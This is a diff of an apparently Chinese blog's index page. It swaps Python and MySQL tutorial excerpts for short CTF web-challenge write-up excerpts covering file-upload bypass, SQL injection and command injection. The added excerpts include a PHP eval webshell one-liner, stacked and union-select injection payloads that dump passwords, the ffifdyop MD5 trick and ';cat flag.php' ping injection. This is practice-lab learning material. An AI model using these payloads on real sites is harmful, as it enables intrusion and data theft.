@@ -204,15 +204,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -272,203 +272,41 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/01/20/upload/" aria-label="upload"></a>
+      <a class="post-link" href="/2025/03/16/%5BSUCTF%202019%5DCheckIn/" aria-label="[SUCTF 2019]CheckIn"></a>
     
     
     <div class="post-cover-left">
       
-        
-        
-          <img data-src="../images/17369576223624.jpg" data-sizes="auto" alt="upload" class="lazyload">
-        
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[SUCTF 2019]CheckIn" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-01-20</span>
-        <span><span class="icon-pencil"></span>4.3k 字</span>
-        <span><span class="icon-clock"></span>16 分钟</span>
-      </div>
-      <h2 class="post-title">upload</h2>
-      <article class="post-article">
-        
-          在看题解的途中看到很详细的题解：pass-18:
-[点此跳转]:Upload-Lab第18关：巧用条件竞争，轻松绕过上传限制！ | CN-SEC 中文网
-此大佬的其他题解也很好
-
- Pass-01-前端JS绕过
-这是一个典型的前端绕过，因为它是通过js的弹窗显示的
-如图我们上传不了.php文件(一句话木马)
-
-法一：
-我们在上传php文件时bp抓包抓不到任何东西
-我们只需将构造的php文件（一句话木马)的后缀名改为.jpg|.png|.gif即可
-这样就能抓到包
-
-然后我们在抓到的数据包中将.png再改回.php再进行发送
-
-
-我们能看到文件已经上传成功，打开之后也是显示php的后缀，这说明我
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/01/08/SQL%E6%B3%A8%E5%85%A5/" aria-label="SQL注入"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="SQL注入" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-01-08</span>
-        <span><span class="icon-pencil"></span>6.2k 字</span>
-        <span><span class="icon-clock"></span>26 分钟</span>
-      </div>
-      <h2 class="post-title">SQL注入</h2>
-      <article class="post-article">
-        
-           SQL注入
- 注入原理
-SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。
- 注入方法
-Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。
- 如何判断注入点？
-老办法：
-and 1=1 页面正常
-and 1=2 页面错误
-可能存在注入点
-新办法：
-select * from users where id=1daadda LIMIT
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2024/12/28/mysql/" aria-label="mysql"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="mysql" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>6.2k 字</span>
-        <span><span class="icon-clock"></span>25 分钟</span>
-      </div>
-      <h2 class="post-title">mysql</h2>
-      <article class="post-article">
-        
-          [TOC]
-数据库（DB）：数据存储的仓库。 数据库管理系统
-（DBMS）：操纵和管理数据库的大型软件。
-SQL：操作关系型数据库的编程语言，是一套标准。
-打开Mysql: mysql -u root -p
- SQL简述
- SQL的概述
-Structure Query Language(结构化查询语言)简称SQL
-数据库管理系统可以通过SQL管理数据库；定义和操作数据，维护数据的完整性和安全性。
-mysql是一种关系型数据库，是建立在关系模型基础上，由多张相互连接的二维表（表格）组成的数据库
-对大小写不敏感
-mysql特点：
-
-
-使用表存储数据，格式统一，便于维护。
-
-
-使用SQL语言操作，标
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2024/12/28/python%E4%B9%8B%E5%BC%82%E5%B8%B8/" aria-label="python之异常"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="python之异常" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>431 字</span>
+        <span><span class="icon-calendar"></span>2025-03-16</span>
+        <span><span class="icon-pencil"></span>340 字</span>
         <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">python之异常</h2>
+      <h2 class="post-title">[SUCTF 2019]CheckIn</h2>
       <article class="post-article">
         
-           捕获常规异常
-语法：
-1234try：	可能发生错误的代码except:    如果发生错误执行的代码
- 捕获指定异常
-语法:
-1234try:    可能发生异常的代码except 异常类型名 as 变量:    当捕获到该异常类型时，执行的代码
- 捕获多个异常
-语法：
-1234try:    可能发生异常的代码except (异常类型1,类型2,...) as 变量:    如果捕获到该异常类型时,执行的代码
- 捕获所有异常
-1234try:    可能发生异常的代码except Exception as 变量:    当捕获到该异常类型时，执行的代码
-例如
-12345678910111
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2024/12/28/python%E4%B9%8B%E6%96%87%E4%BB%B6/" aria-label="python之文件"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17369576223624.jpg" data-sizes="auto" alt="python之文件" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>509 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
-      </div>
-      <h2 class="post-title">python之文件</h2>
-      <article class="post-article">
-        
-           open()函数
-语法：open(name,mode,encoding)
-name：是要打开的目标文件名的字符串（可以包含文件所在的具体路径）
-mode:设置打开文件的模式（访问模式):只读、写入、追加等。
-encoding：编码格式（推荐使用utf-8）
-file=open(‘python.txt’,’r’,encoding=’’ UTF-8”)
-(encoding 的顺序不是第三位，所以不能用位置参数，用关键字参数直接指定)
-mode:
+           
+我们先上传一个写有一句话木马的php文件试一下
+回显说文件后缀不能有ph
+所以我们php3,php5,phhtml都不能用了
+那我们再上传一个后缀名改为jpg的一句话木马文件
 
- 读文件(read)
- 文件对象.read(number)
-如果number没有，那将会读取文件中的全部数据
-注意：按理来说一个汉字三个字节，但rea
+发现不能有&amp;lt;?符号
+那我们使用js
+1&amp;lt;script language=&amp;#x27;php&amp;#x27;&amp;gt; @eval($_POST[&amp;#x27;pass&amp;#x27;]);&amp;lt;/script&amp;gt;
+
+再次提交
+
+发现它后端检查了文件的标识头
+那我们就可以修改一下文件的标识头
+1gif文件：直接在文件内容开头写入GIF89a就行，一般都用这个，因为好记
+
+再次上传，上传成功
+现在就要考虑如何将上
         
       </article>
     </div>
@@ -478,46 +316,42 @@ mode:
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/28/python%E4%B9%8B%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" aria-label="python之基础语法"></a>
+      <a class="post-link" href="/2025/03/15/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHardSQL/" aria-label="[极客大挑战 2019]HardSQL"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="python之基础语法" class="lazyload">
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[极客大挑战 2019]HardSQL" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>592 字</span>
+        <span><span class="icon-calendar"></span>2025-03-15</span>
+        <span><span class="icon-pencil"></span>459 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">python之基础语法</h2>
+      <h2 class="post-title">[极客大挑战 2019]HardSQL</h2>
       <article class="post-article">
         
-           python语法的特点
+           
+判断过滤法一(Fuzz测试)法二(自己试)：过滤了空格
+试了很多，空格只能用反引号和括号来绕过
+过滤了**&amp;#x3D;**
+可以用like来绕过
+过滤了substring与mid
+可以用right与left来绕过
+知识点：
+RIGHT 是一个字符串函数，用于从字符串的右侧提取指定数量的字符
+1RIGHT(string, length)
 
 
-每行代码后无需分号
+string：要提取字符的字符串。
+length：要提取的字符数。如果 length 大于字符串的长度，则返回整个字符串。
+
+LEFT 是一个字符串函数，用于从字符串的左侧提取指定数量的字符。它的语法如下：
+1LEFT(string, length)
 
 
-注意冒号
-
-
-注意缩进
-
-
-变量无需用数据类型关键词定义
-
-
- 基本语法
- 输入输出
-12a=input()#输入print(&amp;#x27;hi&amp;#x27;,a)#输出
-输出时如果print不在同一行，他们输出的结果也不在同一行
-例如：
-123456print(x)print(y)#想要不换行输出，可以在后面加end关键字print(x,end=&amp;quot; &amp;quot;)print(y,end=&amp;quot; &amp;quot;)#end等于什么，就表示输出语句后面跟的是什么
-如果想在输出语句中穿插变量：
-12a=&amp;quot;小明&amp;quot;pri
         
       </article>
     </div>
@@ -527,27 +361,34 @@ mode:
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/28/python%E4%B9%8B%E5%B0%81%E8%A3%85%E3%80%81%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/" aria-label="python之封装、继承与多态"></a>
+      <a class="post-link" href="/2025/03/14/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/" aria-label="[MRCTF2020]你传你🐎呢"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="python之封装、继承与多态" class="lazyload">
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[MRCTF2020]你传你🐎呢" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>468 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-14</span>
+        <span><span class="icon-pencil"></span>308 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">python之封装、继承与多态</h2>
+      <h2 class="post-title">[MRCTF2020]你传你🐎呢</h2>
       <article class="post-article">
         
-           封装
-就是private(私有的)
-关键词:____(双下划线)
-1234567891011121314class phone:    __v=2    def __keep(self):        print(&amp;quot;让cpu以单核模式运行&amp;quot;)    def keep(self):        if(self.__v&amp;gt;=1):            print(&amp;quot;good&amp;quot;)        else :            print(&amp;quot;bad&amp;quot;)ph=phone()# 私有成员无法被类对象直接使用，但是可以被其他的成员使
+          
+判断检验方式我们发现前端是没有检验的
+所以是后端检验文件
+我们先试着上传一个php文件，里面有一句话木马–&amp;gt;上传失败
+上传php文件，抓包修改文件后缀名为png–&amp;gt;上传失败
+上传php文件，抓包修改文件后缀名和Content-Type:png 和 image&amp;#x2F;png –&amp;gt;上传成功
+所以我们猜测是对文件后缀名和Content-Type进行了校验
+如何成功解析php文件但当我们上传了文件之后发现它变成了一个png文件，无法正常解析为php文件
+所以我们需要一个外物来助它变为php文件
+这时候就想到了.user.ini文件和.htaccess文件
+这里上传.user.i
         
       </article>
     </div>
@@ -557,33 +398,38 @@ mode:
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/28/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" aria-label="正则表达式"></a>
+      <a class="post-link" href="/2025/03/13/%5BBJDCTF2020%5DEasy%20MD5/" aria-label="[BJDCTF2020]Easy MD5"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="正则表达式" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]Easy MD5" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-28</span>
-        <span><span class="icon-pencil"></span>1.8k 字</span>
-        <span><span class="icon-clock"></span>7 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-13</span>
+        <span><span class="icon-pencil"></span>210 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">正则表达式</h2>
+      <h2 class="post-title">[BJDCTF2020]Easy MD5</h2>
       <article class="post-article">
         
-          正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。
- 行定位符
-行定位符用于规定匹配模式只能出现在行的开头或者结尾，“^”表示行的开始，&amp;quot;$&amp;quot;表示行的结尾
-例如：^tm  和 tm$
- 元字符
-除了&amp;quot;^“和”$&amp;quot;，还有很多常用的元字符，例如\bmr\w*\b,两个\b表示匹配单词，*表示匹配0次或多次，\w表示匹配字母、数字、下划线或汉字，该正则表达式就表示匹配以字母&amp;quot;mr&amp;quot;开头的单词
+            没找到有用信息
+抓个包看看
 
+响应包里看到一个查询语句
+有个md5语法
+第一关(md5的sql注入)
+所以我们需要输入一个字符串使得它md5加密后返回’or’XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符)
+这里的SQL语句会变成
+1select * from `admin` where password=&amp;#x27;&amp;#x27;or&amp;#x27;XXXXXXXXX&amp;#x27;  
 
+这里用：ffifdyop,这个MD5加密后会返回’or’6XXXXXXXXX
+第二关(md5弱比较)查看源码
 
-元字符
+这里随便上传两个md5编码后是0e…的就行了
+12345678910PM1kVTMBE
         
       </article>
     </div>
@@ -593,31 +439,35 @@ mode:
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/27/python%E4%B9%8B%E5%AE%B9%E5%99%A8(%E5%85%83%E7%BB%84%E3%80%81%E9%9B%86%E5%90%88%E5%92%8C%E5%AD%97%E5%85%B8)/" aria-label="python之容器(元组、集合和字典)"></a>
+      <a class="post-link" href="/2025/03/13/%5BRoarCTF%202019%5DEasy%20Calc/" aria-label="[RoarCTF 2019]Easy Calc"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="python之容器(元组、集合和字典)" class="lazyload">
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[RoarCTF 2019]Easy Calc" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-27</span>
-        <span><span class="icon-pencil"></span>1.4k 字</span>
-        <span><span class="icon-clock"></span>6 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-13</span>
+        <span><span class="icon-pencil"></span>457 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">python之容器(元组、集合和字典)</h2>
+      <h2 class="post-title">[RoarCTF 2019]Easy Calc</h2>
       <article class="post-article">
         
-           元组
-元组(tuple)与列表类似，但元组是不可变的，可简单将其看作是不可变的列表，元组常用于保存不可修改的内容
- 元组的创建与访问（元组用圆括号）
-123456t=(1,2,3,4)#t=(1,)定义元组时，如果元组中只有一个数据，这个元素后面也要加逗号print(t[1])print(t[-2])#访问t的倒数第二个元素#嵌套元组t=((1,2,3),(4,5,6))
-元组其实大部分内容都与列表类似
-本文只会谈及元组所拥有的特点与用法，与列表类似的部分会选择性跳过，不记得的可以访问我上一篇文章（字符串与列表）
- 修改与删除(del)
-上文讲到了，元组是不可修改的，所以我们只能采用重新赋值
+            知识点：
+12php字符串解析漏洞ACII编码
+
+这算是一个php特性漏洞题
+查看源码发现calc.php
+进入发现waf
+
+这里的意思是get传的参数不能包含所过滤的字符(空格、&amp;#x2F;…)
+最后这里也是解题的关键：eval命令执行
+这里需要了解两个知识点：
+php字符串解析漏洞
+12345678910111213141516我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或$_POST的关联数组例如：/?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替例如，/?%20news[
         
       </article>
     </div>
@@ -627,33 +477,190 @@ mode:
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2024/12/27/python%E4%B9%8B%E5%AE%B9%E5%99%A8(%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E5%88%97%E8%A1%A8)/" aria-label="python之容器（字符串与列表）"></a>
+      <a class="post-link" href="/2025/03/12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" aria-label="[强网杯 2019]随便注"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17369576223624.jpg" data-sizes="auto" alt="python之容器（字符串与列表）" class="lazyload">
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[强网杯 2019]随便注" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2024-12-27</span>
-        <span><span class="icon-pencil"></span>689 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-12</span>
+        <span><span class="icon-pencil"></span>1k 字</span>
+        <span><span class="icon-clock"></span>4 分钟</span>
       </div>
-      <h2 class="post-title">python之容器（字符串与列表）</h2>
+      <h2 class="post-title">[强网杯 2019]随便注</h2>
       <article class="post-article">
         
-           字符串
- 字符串访问
-首先我们定义一个字符串
-1s=&amp;quot;python&amp;quot;
-访问方式有多种，我们来看最常规的几种
-12345678#访问字符串中的单个字符print(s[i])#访问字符串中的字串print(s[i:j])#从s[i]到s[j-1]print(s[:j])#从s[0]到s[j-1]print(s[i:])#从s[i]到字符串末尾print(s[i:j:z])#从s[i]到s[j-1]以z步长截取#上述方法也叫切片
- 单个字符编码
-python使用ord()函数返回单个字符的编码，chr()函数把编码转成相应字符
-下面我们来演示一下
-123s=&amp;#x27;A&amp;#x
+          判断闭合方式看题目这是一个sql注入题
+
+ 通过get传参来获取数据
+那我们首先来判断注入类型
+1234输入1-&amp;gt;正常回显输入1&amp;#x27;-&amp;gt;报错输入1“-&amp;gt;正常回显总结：这是一个字符型注入，且用单引号闭合
+
+判断过滤信息但当我们输入select时，它回显内容为：
+
+告诉我们select已被过滤了，不能使用联合注入、报错注入
+查找所能得到的信息那我们还剩下一个堆叠注入
+输入&amp;#39;;show databases;
+回显出了数据库信息
+
+输入&amp;#39;;show tables;
+回显出了表信息
+
+输入&amp;#39;;show columns from 1919810931114
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/11/%5BGXYCTF2019%5DPing%20Ping%20Ping/" aria-label="[GXYCTF2019]Ping Ping Ping"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[GXYCTF2019]Ping Ping Ping" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-11</span>
+        <span><span class="icon-pencil"></span>354 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">[GXYCTF2019]Ping Ping Ping</h2>
+      <article class="post-article">
+        
+           知识点：
+123ping命令执行堆叠命令执行（分号分隔语句）空格的过滤
+
+
+刚进去页面是这样的
+题目名字既然叫ping ping ping 
+还有个ip&amp;#x3D;
+那肯定是考察命令执行
+看?ip&amp;#x3D;那应该是get传参ip&amp;#x3D;
+当我们输入?ip=127.0.0.1后出来了网络应答信息，其实没必要输入127，直接输入1也有回显
+但我们输入?ip=127.0.0.1 | ls时发现回显错误
+猜测应该是过滤了一些东西
+我们输入?ip=127.0.0.1;ls;
+
+ls执行成功，证明;命令执行能行
+但我们输入?ip=1;cat flag.php;时发现回显错误
+经过测试发现是过滤了空
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/11/%5BHCTF%202018%5DWarmUp/" aria-label="[HCTF 2018]WarmUp"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[HCTF 2018]WarmUp" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-11</span>
+        <span><span class="icon-pencil"></span>512 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">[HCTF 2018]WarmUp</h2>
+      <article class="post-article">
+        
+           知识点：
+12审查代码的能力include的特性
+
+ 题目源码：
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    class emmm    &amp;#123;        public static function checkFile(&amp;amp;$page)        &amp;#123;            $whitelist = [&amp;quot;source&amp;quot;=&amp;gt;&amp;
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/11/%5BSUCTF%202019%5DEasySQL/" aria-label="[SUCTF 2019]EasySQL"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[SUCTF 2019]EasySQL" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-11</span>
+        <span><span class="icon-pencil"></span>492 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">[SUCTF 2019]EasySQL</h2>
+      <article class="post-article">
+        
+           考察知识点：
+123456789sql之堆叠注入后端代码猜测1 || ** 类语句理解select 1 from 类语句理解set sql_mode = pipes_as_concat 命令理解（为什么没有过滤set、concat的原因）
+
+ 
+这题本来我是按照正常的sql注入逻辑在写，然后尝试各种闭合，发现都不行
+那肯定不能按联合注入的思路来了
+而且这个题也没有报错回显，排除报错注入
+我们可以用堆叠注入来尝试
+输入1;show databases;&amp;#x2F;&amp;#x2F;查数据库
+回显：Array ( [0] =&amp;gt; 1 ) Array ( [0] =&amp;gt; ctf ) Array 
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/09/CTFSHOW-sql/" aria-label="CTFSHOW-sql"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-sql" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-09</span>
+        <span><span class="icon-pencil"></span>2.1k 字</span>
+        <span><span class="icon-clock"></span>10 分钟</span>
+      </div>
+      <h2 class="post-title">CTFSHOW-sql</h2>
+      <article class="post-article">
+        
+          无过滤(输入无过滤，返回有过滤)web171万能密码
+联合注入
+web172无过滤联合注入
+0&amp;#39; union select 1,(select password from ctfshow_user2 where username=&amp;#39;flag&amp;#39;) %23
+web173用hex()绕过正则
+11&amp;#x27; union select id,hex(username),hex(password) from ctfshow_user3--+
+
+web174(过滤数字、flag)123456//拼接sql语句查找指定ID用户$sql = &amp;quot;select id,usern
         
       </article>
     </div>
@@ -664,7 +671,7 @@ python使用ord()函数返回单个字符的编码，chr()函数把编码转成�
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/5/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">下一页 &raquo;</a>
   </nav>
 
 
@@ -693,10 +700,10 @@ python使用ord()函数返回单个字符的编码，chr()函数把编码转成�
     
       <div>
         <span class="icon-brush"></span>
-        91.7k
+        120.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        06:19
+        08:20
       </div>
     
     
@@ -732,15 +739,15 @@ python使用ord()函数返回单个字符的编码，chr()函数把编码转成�
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
